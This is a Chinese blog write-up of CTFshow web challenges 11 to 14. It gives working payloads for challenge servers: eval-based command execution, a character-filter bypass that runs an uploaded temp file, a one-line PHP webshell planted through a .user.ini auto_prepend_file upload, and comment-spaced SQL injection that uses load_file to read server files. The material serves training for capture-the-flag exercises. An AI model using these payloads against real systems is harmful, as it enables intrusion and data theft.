+<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>session的理解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhengxijia2012/article/details/73437376">https://blog.csdn.net/zhengxijia2012/article/details/73437376</a></p>
+<p>session的用法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/sm20170867238/article/details/90745969">https://blog.csdn.net/sm20170867238/article/details/90745969</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/c61eaafb301c4c13af073b953cea69df" alt="image-20211007151228470"></p>
+<p>删除储存的session，密码填空或抓包删除也一样</p>
+<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/328bcc41d6c84857a495ab0b7620a11e" alt="image-20211007154545066"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/9fb0cb76734e41f3bddf1ed44c25bc61" alt="image-20211007154852714"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/26bd602d383240e8b4f0808128b60e50" alt="image-20211007155148386"></p>
+<p>一开始我各种方法，system();进行查看。可是没有回显。</p>
+<p>这时想到了可以使用scandir()来查看目录文件。</p>
+<p>那好，构造pyload: ?cmd&#x3D;print_r(scandir(“.”));&#x2F;&#x2F;查看当前所有的目录文件 </p>
+<p>或者是使用glob()函数也可以。它返回一个包含匹配指定模式的文件名或目录的数组。pyload: ?cmd&#x3D;print_r(glob(“<em>.</em>“)); ,同样也可以显示目录文件</p>
+<p>举个例子:<br> <strong>glob(“<em>“) 匹配任意文件<br> glob(“</em>.txt”)匹配以txt为后缀的文件</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/d8e7d7803f8842f38df78c6b1a466718" alt="image-20211007154648070"></p>
+<p>使用show_source()函数.此函数是对文件进行 PHP 语法高亮显示。（show_source函数是highlight_file()函数的别名）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/52863b0391eb450abb57e47d1f723ed8" alt="image-20211007154732850"></p>
+<h3 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>此段代码要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等。可以使用的有：p &#96; ? &#x2F; + &lt; &gt; &#x3D;</p>
+<p>2.3：构造cmd</p>
+<pre><code>    通过可用的字符构造cmd=?&gt;&lt;?=`.+/??p/p?p??????`，由eval（$cmd）来运行临时文件
+
+    解释构造原理：
+</code></pre>
+<p>2.3.1：<code>&lt;?= $cmd ?&gt;</code> 等于 <code>&lt;?php echo($cmd) ?&gt;</code></p>
+<pre><code>    在php中，&lt;? ?&gt;称为短标签，&lt;?php ?&gt;称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签。php5.4.0以后， &lt;?= 总是可代替 &lt;? echo。
+
+    例：以下代码在php7.4环境下运行，结果均为2021。
+
+&lt;?php echo(date(&#39;Y&#39;)) ?&gt;
+&lt;?php eval(&quot;echo(date(&#39;Y&#39;));&quot;) ?&gt;
+&lt;?= date(&#39;Y&#39;); ?&gt;
+&lt;?php eval(&quot;?&gt;&lt;?= date(&#39;Y&#39;);&quot;) ?&gt;
+
+    （php在线运行测试http://www.dooccn.com/php7.4/）
+</code></pre>
+<p>2.3.2：反引号&#96;&#96;（键盘Tab键上面那个键）</p>
+<pre><code>    在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。如下语句可得系统日期:
+</code></pre>
+<p><code>&lt;?= </code>date<code> ?&gt;</code></p>
+<p>2.3.3：点 .</p>
+<pre><code>    点命令等于source命令，用来执行文件。
+
+    source /home/user/bash   等同于   . /home/user/bash
+</code></pre>
+<p>2.3.4：加号 +</p>
+<pre><code>    URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B。
+</code></pre>
+<p>2.3.5：&#x2F;??p&#x2F;p?p??????</p>
+<p>2.3.5.1：临时文件夹目录</p>
+<pre><code>    php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是/tmp目录。
+</code></pre>
+<p>2.3.5.2：临时文件命名规则</p>
+<pre><code>    默认为 php+4或者6位随机数字和大小写字母，在windows下有tmp后缀，linux没有。比如windows下：phpXXXXXX.tmp  linux下：phpXXXXXX。
+</code></pre>
+<p>2.3.5.3：通配符</p>
+<pre><code>    问号?代表一个任意字符，通配符/??p/p?p??????匹配/tmp/phpxxxxxx
+</code></pre>
+<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>扫描后发现存在upload.php.bak</p>
+<blockquote>
+<p>.bak文件是备份文件。<br>这里列举一下常见的源码泄露<br>.hg源码泄漏<br>.git源码泄漏<br>.DS_Store文件泄漏<br>.phps .bak结尾的网页</p>
+</blockquote>
+<p>得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我们要上传一句话木马，文件大小要小于24字节，名字长度要小于9，后缀小于等于3，名字中不能有php</span></span><br></pre></td></tr></table></figure>
+
+<p>上传1.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]);<span class="comment">#刚好24字节</span></span><br></pre></td></tr></table></figure>
+
+<p>上传.user.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file是什么是意思呢。它就是设置页眉和脚注，可以保证它们在每个页面的前后被载入。使用这些指令包含的文件可以像使用include()语句包含的文件一样</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>));<span class="comment">//a=print_r(scandir(&quot;.&quot;));</span></span><br><span class="line">a=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里用post传值</p>
+<p>也可以用get方式</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/6a1136f01aa7435e8578335d690ecc20" alt="image-20211017163203312"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/63b357920bf048eebdaafeb051a87f81" alt="image-20211017163215138"></p>
+<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>我们先来看一下网站源代码有条提示<br>if(preg_match(’&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;is’, $_GET[‘query’])){<br>die(’@A@’);<br>}<br>过滤的关键词有information_schema.tables，information_schema.columns，linestring，空格，polygon。在这里提供一种绕过的方法——反引号<br><strong>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号。</strong><br>例如information_schema.tables和information_schema.<code>tables</code>都可以使用。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/24dbcca6751e429a856c4f53ff5ebc49" alt="image-20211017171431708"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/669b19f51ba742d78b76881baba47c79" alt="image-20211017171437533"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/508f302b760f4cdda87338ab0785a7ba" alt="image-20211017171445429"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/79fb59a8350645a4b816ef00ad379b3c" alt="image-20211017171449417"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">load_file</span>(<span class="string">&#x27;/var/www/html/secret.php&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>到这我们发现数据库中并没有我们想要的flag，但是有一条提示tell you a secret,secert has a secret… 所以很有可能flag在secret.php中，现在就有一个问题，我们怎么从数据库中查看文件内容呢，mysql提供了读取本地文件的函数load_file()</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/294a91ef48ea4bba967a2eaf2051042c" alt="image-20211017172031841"></p>
+<p>得到如下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span><br><span class="line">&#125;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是如果&#x2F;tmp&#x2F;gtf1y中的内容为ctf.show则输出&#x2F;real_flag_is_here中的值，所以我们直接将&#x2F;real_flag_is_here读取即可得到flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">load_file</span>(<span class="string">&#x27;/real_flag_is_here&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/e05fa8ed81e544e0be41d4a91774de6e" alt="image-20211017172132649"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://md.b0ter.top">B0ter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://md.b0ter.top/post/d77ca5d926244e0294ae1d4d30b49579/">https://md.b0ter.top/post/d77ca5d926244e0294ae1d4d30b49579/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://md.b0ter.top" target="_blank">B0ter's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">CTF&amp;Web</a></div><div class="post_share"><div class="social-share" data-image="https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/post/df67fb7dc9bc4b44b46f3bc7ef7cda2e/" title="CTFshow刷题-PHP特性"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/df67fb7dc9bc4b44b46f3bc7ef7cda2e" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTFshow刷题-PHP特性</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/df67fb7dc9bc4b44b46f3bc7ef7cda2e/" title="CTFshow刷题-PHP特性"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/df67fb7dc9bc4b44b46f3bc7ef7cda2e" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-29</div><div class="title">CTFshow刷题-PHP特性</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/19/204bd14f36324109b3cc026c10b50360" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">B0ter</div><div class="author-info__description">当你的才华还撑不起你的野心时，应该静下心去学习。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/B0ter"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">特别声明：严禁利用所提到的漏洞和技术进行非法攻击，否则后果自负，本人不承担任何责任!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web4-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">web4(文件包含)前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5%EF%BC%88md5%E5%BC%B1%E6%AF%94%E8%BE%83%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">web5（md5弱比较）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web6%EF%BC%88%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%9A%84sql%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">web6（过滤空格的sql）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web7%EF%BC%88%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E3%80%81union%E7%9A%84sql%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web7（过滤空格、union的sql盲注）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web8%EF%BC%88%E5%A4%9A%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">web8（多过滤了逗号）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web10"><span class="toc-number">7.</span> <span class="toc-text">web10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web11"><span class="toc-number">8.</span> <span class="toc-text">web11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web12"><span class="toc-number">9.</span> <span class="toc-text">web12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9"><span class="toc-number">10.</span> <span class="toc-text">红包题第二弹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web13"><span class="toc-number">11.</span> <span class="toc-text">web13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web14"><span class="toc-number">12.</span> <span class="toc-text">web14</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/5c020f8dd96c445d868e1f15627be035/" title="记一次校园网站漏洞通杀"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/19/5c020f8dd96c445d868e1f15627be035" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次校园网站漏洞通杀"/></a><div class="content"><a class="title" href="/post/5c020f8dd96c445d868e1f15627be035/" title="记一次校园网站漏洞通杀">记一次校园网站漏洞通杀</a><time datetime="2022-12-11T16:00:00.000Z" title="发表于 2022-12-12 00:00:00">2022-12-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d9c1542fed784d7cb4a56bcb276d379d/" title="CTFshow刷题-Crypto"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/d9c1542fed784d7cb4a56bcb276d379d" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow刷题-Crypto"/></a><div class="content"><a class="title" href="/post/d9c1542fed784d7cb4a56bcb276d379d/" title="CTFshow刷题-Crypto">CTFshow刷题-Crypto</a><time datetime="2022-11-10T10:42:26.000Z" title="发表于 2022-11-10 18:42:26">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/df67fb7dc9bc4b44b46f3bc7ef7cda2e/" title="CTFshow刷题-PHP特性"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/df67fb7dc9bc4b44b46f3bc7ef7cda2e" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow刷题-PHP特性"/></a><div class="content"><a class="title" href="/post/df67fb7dc9bc4b44b46f3bc7ef7cda2e/" title="CTFshow刷题-PHP特性">CTFshow刷题-PHP特性</a><time datetime="2021-10-29T10:29:03.000Z" title="发表于 2021-10-29 18:29:03">2021-10-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d77ca5d926244e0294ae1d4d30b49579/" title="CTFshow刷题-Web(4-14)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/02/22/d77ca5d926244e0294ae1d4d30b49579" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFshow刷题-Web(4-14)"/></a><div class="content"><a class="title" href="/post/d77ca5d926244e0294ae1d4d30b49579/" title="CTFshow刷题-Web(4-14)">CTFshow刷题-Web(4-14)</a><time datetime="2021-10-16T16:00:00.000Z" title="发表于 2021-10-17 00:00:00">2021-10-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By B0ter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" 